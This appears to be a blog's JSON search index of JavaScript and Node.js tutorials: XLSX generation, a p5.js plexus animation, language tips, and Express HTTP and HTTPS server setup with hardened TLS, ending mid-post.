\"${msg.data}\"`); } socket.onerror = (err) =&gt; { console.log(\"ERROR\", err); } socket.onclose = () =&gt; { console.log(\"CLOSED\"); } return socket; } let socket = connectSocket('wss://testing.com:8443'); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;" }, { "title": "Creating XLSX Documents in Javascript (Advanced)", "url": "/posts/creating-xlsx-documents-in-javascript-advanced/", "categories": "javascript, programming", "tags": "javascript, programming, xlsx, excel, nodejs, react", "date": "2021-04-24 17:39:40 +1000", "snippet": "In this post we’ll look at how to create XLSX documents in JavaScript with more advanced features such as custom styling and formulas using the xlsx &amp; js-xlsx packages. This works in both NodeJ...", "content": "In this post we’ll look at how to create XLSX documents in JavaScript with more advanced features such as custom styling and formulas using the xlsx &amp; js-xlsx packages. This works in both NodeJS and React. What we are Making Installing Requirements Data Types String Date Number Styling Font Alignment Fill Formulas How do I Make it Work? Formula Example What we are Making If you only need to write text to your XLSX document and don’t require any styling, then the basic version of this guide may be quicker and more suitable.Installing RequirementsInstall the xlsx &amp; js-xlsx packages using the following command:npm i xlsx js-xlsxData TypesEach sheet in the document will be represented by an Object. The keys of this Object will be the name of the cells (A1, A2, B2, etc).Each cell in our output document will be represented by another Object. This object will contain information such as the value of the cell, styling, and the output format (number, date, percentage, etc).More information about supported data types can be found on the XLSX package documentation page here.Time for examples!String// import XLSX from 'xlsx'; // Use this for Reactconst XLSX = require('xlsx');const JS_XLSX = require('js-xlsx');// Create a new blank XLSX Documentlet workbook = XLSX.utils.book_new();// The data that will be added to the sheetlet worksheetData = {\t'!ref': 'A1:A1', // Sheet Range (Which cells will be included in the output)\t'A1': {\t\tt: 's', // Type\t\tv: 'Test String!', // Value\t},};// Add the sheet to the workbookXLSX.utils.book_append_sheet(workbook, worksheetData, 'Sheet 1');// Save the XLSX FileJS_XLSX.writeFile(workbook, 'FILE_NAME.xlsx'); The !ref must contain the output range of the sheet. Cells that are not in this range will not be rendered. The t key in the A1 Object stands for Type. The value of 's' stands for String/Text. The v key in the A1 Object stands for Value. The value here is the text we want in the cell.DateTo insert a Date, we use the a value of 'd' in the Type field:let worksheetData = {\t'!ref': 'A1:B1',\t'A1': { t: 's', v: 'Test String!' },\t'B1': {\t\tt: 'd',\t// Type\t\tv: (new Date()) // Value\t}};NumberWhen working with numbers we need to specify the number format. We do this by adding another key s which stands for Style/Theme. An Object must be provided as the value and contain a key called numFmt which specifies the number format (Integer, Float, Percentage, Fraction, etc).let worksheetData = {\t'!ref': 'A1:C2',\t'A1': {\t\tt:'n', // Type\t\tv: 256, // Value\t\ts: { numFmt: 1 } // Style\t},\t'B1': {\t\tt:'n',\t\tv: 3.14159,\t\ts: { numFmt: 2 }\t},\t'C1': {\t\tt:'n',\t\tv: 0.47836,\t\ts: { numFmt: 10 }\t},\t'A2': {\t\tt:'n',\t\tv: 0.47836,\t\ts: { numFmt: 11 }\t},\t'B2': {\t\tt:'n',\t\tv: 0.47836,\t\ts: { numFmt: 12 }\t},\t'C2': {\t\tt:'n',\t\tv: 21567.489,\t\ts: { numFmt: '_-\"$\"* #,##0.00_-;\\\\-\"$\"* #,##0.00_-;_-\"$\"* \"-\"??_-;_-@_-' },\t},}; numFmt: 1 means Integer (1, 2, 3 , etc). numFmt: 2 means Float (0.523, 11.25, etc). numFmt: 10 means Percentage (0.85%, 59.23%, etc). numFmt: 11 means Scientific Notation (3.94E+03, 6.85E-01, etc). numFmt: 12 means Single Digit Fraction (1/3, 6/7, etc). numFmt: '_-\"$\"* #,##0.00_-;\\\\-\"$\"* #,##0.00_-;_-\"$\"* \"-\"??_-;_-@_-' mean Accounting mode ($23,582.64, $0.32, etc). A more complete list of these codes can be found here.StylingWe can modify the styling by supplying additional parameters to the Object in the s field.Documentation with additional options can be found here.Fontlet worksheetData = {\t'!ref': 'A1:B1',\t'A1': {\t\tt: 's',\t\tv: 'String 1',\t\ts: {\t\t\tfont: {\t\t\t\tname: 'Verdana',\t\t\t\tsz: 20,\t\t\t\tbold: true,\t\t\t\tunderline: true,\t\t\t\titalic: true,\t\t\t\tcolor: { rgb: 'FF12A304' },\t// Hex Value: ARGB\t\t\t}\t\t}\t},\t'B1': {\t\tt: 's',\t\tv: 'String 2',\t\ts: {\t\t\tfont: {\t\t\t\tname: 'Times New Roman',\t\t\t\tsz: 10,\t\t\t\tstrike: true,\t\t\t}\t\t}\t},};Alignmentlet worksheetData = {\t'!ref': 'A1:B1',\t'A1': {\t\tt: 's',\t\tv: 'String 1',\t\ts: {\t\t\tfont: {\t\t\t\tname: 'Verdana',\t\t\t},\t\t\talignment: {\t\t\t\thorizontal: 'left',\t\t\t\tvertical: 'bottom',\t\t\t}\t\t}\t},\t'B1': {\t\tt: 's',\t\tv: 'String 2',\t\ts: {\t\t\tfont: {\t\t\t\tname: 'Arial',\t\t\t},\t\t\talignment: {\t\t\t\thorizontal: 'right',\t\t\t\tvertical: 'top',\t\t\t}\t\t}\t},};Filllet worksheetData = {\t'!ref': 'A1:B1',\t'A1': {\t\tt:'s',\t\tv: 'COLOURS!',\t\ts: {\t\t\tfont: {\t\t\t\tname: 'IMPACT',\t\t\t\tsz: 32,\t\t\t\tcolor: { rgb: 'FFE609EA' },\t// ARGB Hex Value\t\t\t},\t\t\tfill: {\t\t\t\tfgColor: { rgb: 'FF0269D8' },\t// ARGB Hex Value\t\t\t},\t\t\talignment: {\t\t\t\thorizontal: 'center',\t\t\t\tvertical: 'center',\t\t\t}\t\t}\t},};FormulasAt the time of writing the js-xlsx module doesn’t yet support formulas. This is inconvenient because the xlsx module does support formulas, but it doesn’t support styling. We don’t want to choose between styling and formulas, we want both.Luckily, there are smart people who’ve had the same issue and made a fix!How do I Make it Work?For reference the package versions being used in this guide are: js-xlsx: 0.8.22 xlsx: 0.16.9From the above screenshot we can add formula support into js-xlsx with 2 small code changes: Open the file node_modules/js-xlsx/xlsx.js. Replace line 7685 with the following line: if ( ! (cell.v || cell.s || cell.f ) ) return \"\"; Replace line 7710 with the following 2 lines: var o = { r: ref };var v = cell.f ? writetag('f', escapexml(cell.f)) : writetag('v', escapexml(vv)); Done!!!Formula ExampleTo add a formula we need to create an f key in our cell Object and store our formula there:let worksheetData = {\t'!ref': 'A1:E2',\t// Generate some random values in the second row \t'A2': { t: 'n', v: Math.round(Math.random()*100), s: { numFmt: 1 } },\t'B2': { t: 'n', v: Math.round(Math.random()*100), s: { numFmt: 1 } },\t'C2': { t: 'n', v: Math.round(Math.random()*100), s: { numFmt: 1 } },\t'D2': { t: 'n', v: Math.round(Math.random()*100), s: { numFmt: 1 } },\t// Add a header\t'E1': { t: 's', v: 'Total Sum', s: { font: { bold: true, underline: true } } },\t\t// Add formula\t'E2': {\t\tt: 'n',\t\tf: 'SUM(A2:D2)'\t},};" }, { "title": "Creating XLSX Documents in Javascript (Basic)", "url": "/posts/creating-xlsx-documents-in-javascript-basic/", "categories": "javascript, programming", "tags": "javascript, programming, xlsx, excel, nodejs, react", "date": "2021-04-24 13:53:16 +1000", "snippet": "In this post we’ll look at how to create basic XLSX documents in JavaScript using the xlsx package. This works in both NodeJS and React. What we are Making Installing Requirements The CodeWhat w...", "content": "In this post we’ll look at how to create basic XLSX documents in JavaScript using the xlsx package. This works in both NodeJS and React. What we are Making Installing Requirements The CodeWhat we are Making We’ll look at how to add styling and formulas here in the advanced version of this guide.Installing RequirementsInstall the xlsx package using the following command:npm i xlsxThe CodeTo generate the above example, our output data needs to be an Array of String Arrays. Each Array represents a single row in the document:// import XLSX from 'xlsx'; // Use this for Reactconst XLSX = require('xlsx');// Create a new blank XLSX Documentlet workbook = XLSX.utils.book_new();// The data that will be added to the sheetlet dataForSheet = [\t['Column 1', 'Column 2','Column 3','Column 4','Column 5','Column 6'],\t['Data 1', 'Data 2','Data 3','Data 4','Data 5','Data 6'],\t['Data 7', 'Data 8','Data 9','Data 10'],\t['Data 11', 'Data 12','','','Data 13','Data 14','Data 15'],];// Convert the Array data to a sheetlet sheetData = XLSX.utils.aoa_to_sheet(dataForSheet);// Add the sheet to the workbookXLSX.utils.book_append_sheet(workbook, sheetData, 'Sheet 1');// Save the XLSX File.XLSX.writeFile(workbook, 'FILE_NAME.xlsx'); NOTE: Multiple sheets can be added to a single workbook (document)." }, { "title": "Building a Plexus", "url": "/posts/building-a-plexus/", "categories": "javascript, programming", "tags": "javascript, programming, p5.js, algorithm, plexus, fun", "date": "2021-04-16 22:53:16 +1000", "snippet": "In this post we’ll look at how to build a Plexus in JavaScript using the p5.js library. What we are Making How we will make it Setup p5.js Points Generating Points D...", "content": "In this post we’ll look at how to build a Plexus in JavaScript using the p5.js library. What we are Making How we will make it Setup p5.js Points Generating Points Drawing Points Lines Draw Lines to Nearby Points Fading Line Colour Moving Points Conclusion More Ideas Colour Change Horizontal Only Vertical Only Horizontal &amp; Vertical Full CodeWhat we are MakingOur goal is to build something that looks like this:How we will make it Generate random points all over the screen. Draw lines between points that are close to each other. Closer points will have a brighter coloured line. Move the points slightly each frame. Repeat.Setup p5.jsWe’ll start off by setting up our p5.js project. Boilerplate code for p5.js can be found here on my GitHub. Some custom functions are included in this boilerplate to deal with the inverted y-axis when using browsers. These functions make the coordinate (0,0) draw at the bottom-left instead of the top-left.We’ll only need to modify the script.js file inside the boilerplate code.PointsGenerating PointsOur first step will be to generate a bunch of random points on the screen that will slowly move in a random direction.Let’s start off by creating a Point class:class Point {\tconstructor(backgroundSizeX, backgroundSizeY, moveSpeed, pointSize) {\t\t// Store properties\t\tthis.moveSpeed = moveSpeed;\t\tthis.pointSize = pointSize;\t\tthis.backgroundSize = { x: backgroundSizeX, y: backgroundSizeY };\t\t// Generate random starting position\t\tthis.position = {\t\t\tx: Math.floor(Math.random() * (this.backgroundSize.x - 1)),\t\t\ty: Math.floor(Math.random() * (this.backgroundSize.y - 1))\t\t};\t\t// Generate random starting direction\t\tlet xDir = Math.random()*2 - 1;\t\tlet yDir = Math.random()*2 - 1;\t\t\t\t// Convert to a unit vector\t\tlet length = Math.sqrt(xDir**2 + yDir**2);\t\tthis.direction = { x: xDir/length, y: yDir/length };\t}}In the setup function of p5.js we’ll now create a bunch of instances of this class. We’ll also need to create an array to store the points, as well as some variables for MOVE_SPEED, POINT_SIZE, and TOTAL_POINTS:const MOVE_SPEED = 0.2;const POINT_SIZE = 5;let TOTAL_POINTS = 300;let SCREEN_WIDTH = 0;let SCREEN_HEIGHT = 0;let POINT_LIST = [];// Initial Setupfunction setup() {\tSCREEN_WIDTH = window.innerWidth - 20;\tSCREEN_HEIGHT = window.innerHeight - 20\tcreateCanvas(SCREEN_WIDTH, SCREEN_HEIGHT);\t// Create random Points all over the screen\tfor (let i = 0; i &lt; TOTAL_POINTS; i++) {\t\tPOINT_LIST.push(new Point(SCREEN_WIDTH, SCREEN_HEIGHT, MOVE_SPEED, POINT_SIZE));\t}\tframeRate(30);}Drawing PointsNow that we have a list of Point objects, we can draw them to the screen. We’ll do this by adding some code to the draw function that loops over all the points and draws them every frame:// To be called each framefunction draw() {\t// Draw background &amp; set Rectangle draw mode\tbackground(255);\trectMode(CENTER);\t// Draw scene rectangle\tfill(30,30,30);\tstroke(30,30,30);\tdrawRect(SCREEN_WIDTH / 2, SCREEN_HEIGHT / 2, SCREEN_WIDTH, SCREEN_HEIGHT)\t// Draw Points\tPOINT_LIST.forEach(currentPoint =&gt; {\t\tdrawPoint(currentPoint);\t});}const drawPoint = (pointObject) =&gt; {\tstroke(200,200,200);\tfill(200,200,200);\tdrawCircle(pointObject.position.x, pointObject.position.y, pointObject.pointSize);}If we open the index.html file, we should see the following:LinesDraw Lines to Nearby PointsWe want our points to have lines drawn to other nearby points.At the top of our code let’s add the following constant:const DISTANCE_TO_START_DRAWING_LINES = 150; 2 Points that are further away than this will not have a line between them. NOTE: you may want to adjust this value based on your screen size.For each point we need to find all the other points within this radius and draw a line to them.We’ll add a function called drawLineToNearby which will do this for us. This function will be called every frame before each point is drawn.function draw() {\t// Draw background &amp; set Rectangle draw mode\tbackground(255);\trectMode(CENTER);\t// Draw scene rectangle\tfill(30,30,30);\tstroke(30,30,30);\tdrawRect(SCREEN_WIDTH / 2, SCREEN_HEIGHT / 2, SCREEN_WIDTH, SCREEN_HEIGHT)\t// Draw Lines to Nearby Points\tPOINT_LIST.forEach(currentPoint =&gt; {\t\tdrawLineToNearby(currentPoint);\t});\t// Draw Points\tPOINT_LIST.forEach(currentPoint =&gt; {\t\tdrawPoint(currentPoint);\t});}const drawLineToNearby = (targetPoint) =&gt; {\tstroke(200,200,200);\tPOINT_LIST.forEach(point =&gt; {\t\tlet distanceBetween = distanceBetweenPoints(targetPoint, point);\t\t// Only draw the line if it's close enough\t\tif (distanceBetween &lt; DISTANCE_TO_START_DRAWING_LINES) {\t\t\tdrawLine(targetPoint.position.x, targetPoint.position.y, point.position.x, point.position.y);\t\t}\t})}// Calculate Euclidean distance between 2 pointsconst distanceBetweenPoints = (pointA, pointB) =&gt; {\treturn Math.sqrt(Math.pow(pointA.position.x - pointB.position.x, 2) + Math.pow(pointA.position.y - pointB.position.y, 2));}Here’s what we have so far:Fading Line ColourThis is looking better, but we want the lines that connect points that are closer together to be brighter.We’ll do this by adjusting the Alpha for each line based off the distance. Far away points will be closer to Alpha 0 and nearby points will be closer to Alpha 255.We can achieve this using the map function in p5.js. This function takes 5 arguments and maps an input from one range to another range:map(50, 0, 100, 1, 6) // returns 3.5 50 is halfway between 0 and 100. The output will be the number halfway between 1 and 6, which is 3.5.Here’s the code to implement this in our Plexus:const drawLineToNearby = (targetPoint) =&gt; {\tPOINT_LIST.forEach(point =&gt; {\t\tlet distanceBetween = distanceBetweenPoints(targetPoint, point);\t\t// Only draw the line if it's close enough\t\tif (distanceBetween &lt; DISTANCE_TO_START_DRAWING_LINES) {\t\t\tlet alpha = map(distanceBetween, 0, DISTANCE_TO_START_DRAWING_LINES, 255, 0);\t\t\tstroke(200, 200, 200, alpha);\t\t\tdrawLine(targetPoint.position.x, targetPoint.position.y, point.position.x, point.position.y);\t\t}\t})}What we have currently:Moving PointsAs a final touch let’s make the points move around the screen slowly.We’ll do this by adding an update function to our Point class that will be called every frame. This will change the points position over time.class Point {\tconstructor(backgroundSizeX, backgroundSizeY, moveSpeed, pointSize) {\t\t// Store properties\t\tthis.moveSpeed = moveSpeed;\t\tthis.pointSize = pointSize;\t\tthis.backgroundSize = { x: backgroundSizeX, y: backgroundSizeY };\t\t// Generate random starting position\t\tthis.position = {\t\t\tx: Math.floor(Math.random() * (this.backgroundSize.x - 1)),\t\t\ty: Math.floor(Math.random() * (this.backgroundSize.y - 1))\t\t};\t\t// Generate random starting direction\t\tlet xDir = Math.random()*2 - 1;\t\tlet yDir = Math.random()*2 - 1;\t\t\t\t// Convert to a unit vector\t\tlet length = Math.sqrt(xDir**2 + yDir**2);\t\tthis.direction = { x: xDir/length, y: yDir/length };\t}\tupdate() {\t\t// Update the position of the object\t\tthis.position.x += this.direction.x * this.moveSpeed;\t\tthis.position.y += this.direction.y * this.moveSpeed;\t\t// Handle going off the left &amp; right sides of the screen\t\tif (this.position.x &lt; 1) this.direction.x = Math.abs(this.direction.x);\t\telse if (this.position.x &gt; this.backgroundSize.x-2) this.direction.x = -Math.abs(this.direction.x);\t\t// Handle going off the top and bottom sides of the screen\t\tif (this.position.y &lt; 1) this.direction.y = Math.abs(this.direction.y);\t\telse if (this.position.y &gt; this.backgroundSize.y-2) this.direction.y = -Math.abs(this.direction.y);\t}}We’ll call this update function every frame after we have drawn all the points:function draw() {\t// Draw background &amp; set Rectangle draw mode\tbackground(255);\trectMode(CENTER);\t// Draw scene rectangle\tfill(30,30,30);\tstroke(30,30,30);\tdrawRect(SCREEN_WIDTH / 2, SCREEN_HEIGHT / 2, SCREEN_WIDTH, SCREEN_HEIGHT)\t// Draw Lines to Nearby Points\tPOINT_LIST.forEach(currentPoint =&gt; {\t\tdrawLineToNearby(currentPoint);\t});\t// Draw Points &amp; Update their positions\tPOINT_LIST.forEach(currentPoint =&gt; {\t\tdrawPoint(currentPoint);\t\tcurrentPoint.update();\t});}Conclusion We now have an animated 2D plexus effect! I encourage you to play around with the MOVE_SPEED, POINT_SIZE, DISTANCE_TO_START_DRAWING_LINES and TOTAL_POINTS variables as well as the drawLineToNearby function to see what you like best.More IdeasColour Change Demo available here This effect is done by changing the colour hue based off the x-coordinate using the map function. Full code below.Horizontal Only Demo available hereVertical OnlyExample 1 Demo available hereExample 2Horizontal &amp; Vertical Demo available hereFull Codeconst MOVE_SPEED = 0.2;const POINT_SIZE = 5;const DISTANCE_TO_START_DRAWING_LINES = 150;let TOTAL_POINTS = 300;let SCREEN_WIDTH = 0;let SCREEN_HEIGHT = 0;let POINT_LIST = [];// Drawing functions to handled inverted Y-Axis of the browserconst drawRect = (x, y, w, h) =&gt; rect(x, SCREEN_HEIGHT-y, w, h);const drawLine = (x1, y1, x2, y2) =&gt; line(x1, SCREEN_HEIGHT-y1, x2, SCREEN_HEIGHT-y2);const drawCircle = (x, y, d) =&gt; circle(x, SCREEN_HEIGHT-y, d);const drawArc = (x, y, w, h, startAngle, stopAngle) =&gt; arc(x, SCREEN_HEIGHT-y, w, h, 2*Math.PI-stopAngle, 2*Math.PI-startAngle);const drawTri = (x1, y1, x2, y2, x3, y3) =&gt; triangle(x1, SCREEN_HEIGHT-y1, x2, SCREEN_HEIGHT-y2, x3, SCREEN_HEIGHT-y3);// Initial Setupfunction setup() {\tSCREEN_WIDTH = window.innerWidth - 20;\tSCREEN_HEIGHT = window.innerHeight - 20\tcreateCanvas(SCREEN_WIDTH, SCREEN_HEIGHT);\t// Create random Points all over the screen\tfor (let i = 0; i &lt; TOTAL_POINTS; i++) {\t\tPOINT_LIST.push(new Point(SCREEN_WIDTH, SCREEN_HEIGHT, MOVE_SPEED, POINT_SIZE));\t}\tframeRate(30);}function draw() {\t// Draw background &amp; set Rectangle draw mode\tbackground(255);\trectMode(CENTER);\t// Draw scene rectangle\tfill(30,30,30);\tstroke(30,30,30);\tdrawRect(SCREEN_WIDTH / 2, SCREEN_HEIGHT / 2, SCREEN_WIDTH, SCREEN_HEIGHT)\t// Draw Lines to Nearby Points\tPOINT_LIST.forEach(currentPoint =&gt; {\t\tdrawLineToNearby(currentPoint);\t});\t// Draw Points &amp; Update their positions\tPOINT_LIST.forEach(currentPoint =&gt; {\t\tdrawPoint(currentPoint);\t\tcurrentPoint.update();\t});}const drawPoint = (pointObject) =&gt; {\tstroke(200,200,200);\tfill(200,200,200);\tdrawCircle(pointObject.position.x, pointObject.position.y, pointObject.pointSize);}const drawLineToNearby = (targetPoint) =&gt; {\tcolorMode(HSB, 360, 100, 100, 100);\tPOINT_LIST.forEach(point =&gt; {\t\tlet distanceBetween = distanceBetweenPoints(targetPoint, point);\t\t// Only draw the line if it's close enough\t\tif (distanceBetween &lt; DISTANCE_TO_START_DRAWING_LINES) {\t\t\tlet colour = map(targetPoint.position.x, 0, targetPoint.backgroundSize.x, 0, 300);\t\t\tlet brightness = map(distanceBetween, 0, DISTANCE_TO_START_DRAWING_LINES, 100, 0);\t\t\tstroke(colour, 100, 100, brightness);\t\t\tdrawLine(targetPoint.position.x, targetPoint.position.y, point.position.x, point.position.y);\t\t}\t})\tcolorMode(RGB, 255);}// Calculate Euclidean distance between 2 pointsconst distanceBetweenPoints = (pointA, pointB) =&gt; {\treturn Math.sqrt(Math.pow(pointA.position.x - pointB.position.x, 2) + Math.pow(pointA.position.y - pointB.position.y, 2));}class Point {\tconstructor(backgroundSizeX, backgroundSizeY, moveSpeed, pointSize) {\t\t// Store properties\t\tthis.moveSpeed = moveSpeed;\t\tthis.pointSize = pointSize;\t\tthis.backgroundSize = { x: backgroundSizeX, y: backgroundSizeY };\t\t// Generate random starting position\t\tthis.position = {\t\t\tx: Math.floor(Math.random() * (this.backgroundSize.x - 1)),\t\t\ty: Math.floor(Math.random() * (this.backgroundSize.y - 1))\t\t};\t\t// Generate random starting direction\t\tlet xDir = Math.random()*2 - 1;\t\tlet yDir = Math.random()*2 - 1;\t\t\t\t// Convert to a unit vector\t\tlet length = Math.sqrt(xDir**2 + yDir**2);\t\tthis.direction = { x: xDir/length, y: yDir/length };\t}\tupdate() {\t\t// Update the position of the object\t\tthis.position.x += this.direction.x * this.moveSpeed;\t\tthis.position.y += this.direction.y * this.moveSpeed;\t\t// Handle going off the left &amp; right sides of the screen\t\tif (this.position.x &lt; 1) this.direction.x = Math.abs(this.direction.x);\t\telse if (this.position.x &gt; this.backgroundSize.x-2) this.direction.x = -Math.abs(this.direction.x);\t\t// Handle going off the top and bottom sides of the screen\t\tif (this.position.y &lt; 1) this.direction.y = Math.abs(this.direction.y);\t\telse if (this.position.y &gt; this.backgroundSize.y-2) this.direction.y = -Math.abs(this.direction.y);\t}}" }, { "title": "JavaScript Tips & Tricks", "url": "/posts/javascript-tips-and-tricks/", "categories": "javascript, programming", "tags": "javascript, nodejs", "date": "2021-04-15 17:32:40 +1000", "snippet": "In this post we’ll look at some useful tip and tricks when using JavaScript. Remove Empty/False Array Elements JSON Templating Sorting an Array of Objects Destructing Spreading Combin...", "content": "In this post we’ll look at some useful tip and tricks when using JavaScript. Remove Empty/False Array Elements JSON Templating Sorting an Array of Objects Destructing Spreading Combining Arrays Combining Objects Function Arguments Create &amp; Submit HTML FormRemove Empty/False Array Elementslet myArray = ['alex', '', '', 'wells', ''];myArray.filter(x =&gt; x); // ['alex', 'wells']let myArray = ['alex', '', null, 0, 1, undefined, false, true, [], {}];myArray.filter(x =&gt; x); // ['alex', 1, true, [], {}]JSON Templatinglet key = 'city';let value = 'Melbourne';let obj = { [key]: value};console.log(obj); // { city: 'Melbourne' }Remove Duplicates from an ArrayMethod 1let myArray = [1,2,4,7,2,3,7,4,7,5,3,2,1,1,5,7,8,8,5,3,3,1,6,0,4,0,5,3,1];let cleanedArray = [...new Set(myArray)];console.log(cleanedArray); // [ 1, 2, 4, 7, 3, 5, 8, 6, 0 ]Method 2 Array elements will be casted to strings. More code. Better if the Object used to remove duplicates is also required.const removeDuplicates = (arr) =&gt; { let elements = {}; arr.forEach(element =&gt; { elements[element] = true; }); return Object.keys(elements);}let myArray = [1,2,4,7,2,3,7,4,7,5,3,2,1,1,5,7,8,8,5,3,3,1,6,0,4,0,5,3,1];removeDuplicates(myArray); // ['0', '1', '2', '3', '4', '5', '6', '7', '8']Sorting an Array of Objects// Sort an Array of Objects by a certain keyconst sortArrayByKey = (array, keyToSortBy, reverse=false) =&gt; {\tif (reverse) {\t\t// Sort the array in reverse order (Highest to Lowest)\t\tarray.sort((a,b) =&gt; a[keyToSortBy] &gt; b[keyToSortBy] ? -1 : 1);\t} else {\t\t// Sort the array in normal order (Lowest to Highest)\t\tarray.sort((a,b) =&gt; a[keyToSortBy] &gt; b[keyToSortBy] ? 1 : -1);\t}}Destructingconst myFunction = ({name, city, country}) =&gt; { console.log(name, city, country);}let obj = { name: 'Alex', city: 'Melbourne', country: 'Australia' };myFunction(obj); // Alex Melbourne Australiaconst myFunction = (data) =&gt; { let { name, city, country } = data; console.log(name, city, country);}let obj = { name: 'Alex', city: 'Melbourne', country: 'Australia' };myFunction(obj); // Alex Melbourne AustraliaSpreadingCombining Arrayslet arrayA = [4, 5, 6];let arrayB = [1, 2, 3, ...arrayA]; arrayB // [1, 2, 3, 4, 5, 6]Combining Objectslet objA = { name: 'Alex', city: 'Sydney' };let objB = { ...objA, city: 'Melbourne', country: 'Australia' };let objC = { city: 'Melbourne', country: 'Australia', ...objA };console.log(objB); // { name: 'Alex', city: 'Melbourne', country: 'Australia' }console.log(objC); // { name: 'Alex', city: 'Sydney', country: 'Australia' }Function Argumentslet args = [10, 30, -5, 0, 100];console.log(Math.min(args)); // NaNconsole.log(Math.min(...args)); // -5const myFunction = (a,b,c) =&gt; { console.log(a,b,c);}let args = [10, 20, 30];myFunction(args) // [10, 20, 30] undefined undefinedmyFunction(...args); // 10 20 30const myFunction = (a, b, ...c) =&gt; { console.log(a,b,c);}myFunction(10, 20, 30, 40, 50) // 10 20 [30, 40, 50]myFunction(10, 20) // 10 20 []myFunction(10) // 10 undefined []Create &amp; Submit HTML Formconst createAndSubmitForm = () =&gt; {\tlet form = document.createElement('form');\tlet formParameter1 = document.createElement('input');\tform.method = 'POST';\tform.action = '/endpoint';\tformParameter1.name='username';\tformParameter1.value='admin';\tform.appendChild(formParameter1);\tdocument.body.appendChild(form);\tform.submit();}createAndSubmitForm();" }, { "title": "NodeJS Express HTTPS Server", "url": "/posts/express-https-server/", "categories": "javascript, nodejs", "tags": "javascript, web, https, http, nodejs, server, express", "date": "2021-04-10 12:30:07 +1000", "snippet": "In this post we’ll look at how to add TLS to an NodeJS express HTTP server.This post will assume that you already know how to setup a HTTP server using express. If you don’t know how to, you can le...", "content": "In this post we’ll look at how to add TLS to an NodeJS express HTTP server.This post will assume that you already know how to setup a HTTP server using express. If you don’t know how to, you can learn how to do it here. Server Options Creating the Server Hardened TLS Configuration Hardened Configuration Example Server OptionsTo add TLS to our server we first need to define an object containing some options:const serverOptions = {\t// Certificate(s) &amp; Key(s)\tcert: fs.readFileSync(path.join(__dirname, 'certs/host.crt')),\tkey: fs.readFileSync(path.join(__dirname, 'certs/host.key')),\t// Optional: TLS Versions\tmaxVersion: 'TLSv1.3',\tminVersion: 'TLSv1.2'}Creating the ServerWe only need to modify one other line of code to enable TLS:const server = require('https').Server(serverOptions, app);The entire code for a simple HTTPS server looks like this:const express = require('express');const path = require('path');const fs = require('fs');const app = express();const PORT = 4443;const serverOptions = {\t// Certificate(s) &amp; Key(s)\tcert: fs.readFileSync(path.join(__dirname, 'certs/host.crt')),\tkey: fs.readFileSync(path.join(__dirname, 'certs/host.key')),\t// TLS Versions\tmaxVersion: 'TLSv1.3',\tminVersion: 'TLSv1.2'}const server = require('https').Server(serverOptions, app);app.get('/', (req, res) =&gt; {\tres.sendFile(path.join(__dirname, 'index.html'));});// Start the Serverserver.listen(PORT, () =&gt; { console.log(`[-] Server Listening on Port ${PORT}`);});Hardened TLS ConfigurationFor a more secure TLS configuration you should do the following: Disable all older/legacy versions of TLS. Use minVersion and maxVersion to specify the supported TLS versions. Disable all insecure &amp; old cipher suites. Use ciphers to specify which cipher suites should be supported. Disable all but the most secure Elliptic Curves for the key exchange. Use ecdhCurve to specify which curves should be supported for the Key Exchange. Disable all signature algorithms that don’t use strong hash functions. Use sigalgs to specify which Server Signature Algorithms should be supported. NOTE Supported Signature Algorithms will vary depending on the type of certificate you are using! Learn more about Server Signature algorithms here. Hardened Configuration Exampleconst serverOptions = {\t// Certificate(s) &amp; Key(s)\tcert: fs.readFileSync(path.join(__dirname, 'certs/host.crt')),\tkey: fs.readFileSync(path.join(__dirname, 'certs/host.key')),\t// TLS Versions\tmaxVersion: 'TLSv1.3',\tminVersion: 'TLSv1.3',\t// Hardened configuration\tciphers: 'TLS_AES_256_GCM_SHA384:TLS_AES_128_GCM_SHA256',\tecdhCurve: 'P-521:P-384',\tsigalgs: 'ecdsa_secp384r1_sha384',\t// Attempt to use server cipher suite preference instead of clients\thonorCipherOrder: true}" }, { "title": "NodeJS Express HTTP Server", "url": "/posts/express-http-server/", "categories": "javascript, nodejs", "tags": "javascript, web, http, nodejs, server, express", "date": "2021-04-09 17:32:40 +1000", "snippet": "In this post we’ll look at how to build a simple HTTP server in NodeJS using the express framework. Server Setup Required Packages Basic Setup Express Basics Routes ...", "content": "In this post we’ll look at how to build a simple HTTP server in NodeJS using the express framework. Server Setup Required Packages Basic Setup Express Basics Routes Sending Back Data Response Codes Route Parameters Query Parameters Cookies JSON Body More Advanced Stuff Custom Headers Next Route Server SetupRequired PackagesFirst step is to install the required npm packages:npm i express body-parserBasic SetupOnce the packages are installed, we can use the below code to import the packages and setup our first server:const path = require('path');const express = require('express');const bodyParser = require('body-parser');// Create new Express Serverconst app = express();const server = require('http').Server(app);// Server Configurationconst PORT = 8080;// Support JSON encoded POST request bodiesapp.use(bodyParser.json());// Start the Serverserver.listen(PORT, () =&gt; {\tconsole.log(`[-] Server Listening on Port ${PORT}`);});Nice, our server is now setup! But it’s not very useful as it doesn’t actually do anything. Let’s learn how to setup routes/endpoints so we can listen for request and send back data.Express BasicsRoutesHere is how we create a basic route: The first parameter is a string containing the route path (endpoint). The second parameter is a callback that will be executed when a request is made to the route.// GET Exampleapp.get('/', (req, res) =&gt; {\tres.send('GET Hello!');});// POST Exampleapp.post('/', (req, res) =&gt; {\tres.send('POST Hello!');});The functions names get &amp; post can be changed to any valid HTTP method (OPTIONS, PUT, DELETE, etc) in lowercase.Sending Back DataWhen the callback function is executed, two parameters will be passed in for us to use. These are the req and res parameters short for request and response: req contains information about the request such as headers and any data in the body that may have been sent. res is how we send data back to the client, using the the send and sendFile methods.// The type will automatically be set as HTML if a string is provided.app.get('/home', (req, res) =&gt; {\tres.send('&lt;h1&gt;Home&lt;/h1&gt;');});// The content-type will automatically be set as JSON if an object is provided.app.get('/json', (req, res) =&gt; {\tres.send({ json: true });});// You can also specify the type manuallyapp.get('/text', (req, res) =&gt; {\tres.type('txt');\tres.send('&lt;h1&gt;Home&lt;/h1&gt;');});// Return a file from diskapp.get('/home', (req, res) =&gt; {\tres.sendFile(path.join(__dirname, 'index.html'));});Response CodesWhen data is sent back using the send or sendFile methods a response code of 200 is used. We can specify a custom code using the status and sendStatus methods: If you want to change the status code AND send data back in the body, use the status method. If you only want to send a status code with no body, use the sendStatus method.app.get('/json', (req, res) =&gt; {\t// Send custom HTTP Status code\tres.status(406).send({ json: true });});app.get('/admin', (req, res) =&gt; {\t// Send custom HTTP Status code\tres.sendStatus(404);});Route ParametersWe use Route Parameters as a placeholder variable for data that will be supplied by the user: If the client calls the API /user/53, we want to be able to access the value 53. We can do this by specifying a Route 